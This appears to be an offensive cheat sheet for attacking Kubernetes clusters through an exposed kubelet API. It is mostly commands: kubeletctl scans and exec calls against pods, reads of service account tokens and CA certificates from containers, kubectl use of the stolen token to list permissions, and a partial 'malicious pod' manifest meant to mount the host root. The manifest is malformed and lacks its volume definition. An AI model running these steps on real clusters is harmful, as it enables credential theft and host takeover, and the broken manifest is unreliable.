```bash
curl https://$IP:$API_PORT/ -k
```

```kubeletctl``` https://github.com/cyberark/kubeletctl
- Run any kubelet API call
- Scan for nodes with opened kubelet API
- Scan for containers with RCE
- Run a command on all the available containers by kubelet at the same time
- Get service account tokens from all available containers by kubelet

**_NOTE: kubelet usually runs on PORT 10250_**

```bash
# extract all of the pods from the k8s cluster
kubeletctl --server $IP pods
```

```bash
# scan for pods vulnerable to RCE
kubeletctl --server $IP scan rce
kubeletctl --server $IP exec "cmd" -p $POD_NAME -c $CONTAINER_NAME
```

```bash
# get access to tokens and certificates
kubeletctl --server $IP exec \
"cat /var/run/secrets/kubernetes.io/serviceaccount/token"
"cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
```

```kubectl``` 
```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

```bash
# list pods
kubectl --token=$token --certificate-authority=ca.crt \
--server=https://$IP:$API_IP get pods

# list permissions 
kubectl --token=$token --certificate-authority=ca.crt \
--server=https://$IP:$API_PORT auth can-i --list

# example pods           []            []               [get create list]
```

# MALICIOUS POD


```yml
apiVersion: v1 
kind: Pod 
metadata:
	name: nginxt 
	namespace: default
spec: 
	containers:
		- name: nginxt 
		  image: nginx:1.14.2 
		  volumeMounts:
			- mountPath: /root name: mount-root-into-mnt
			  name: mount-root-into-mnt
```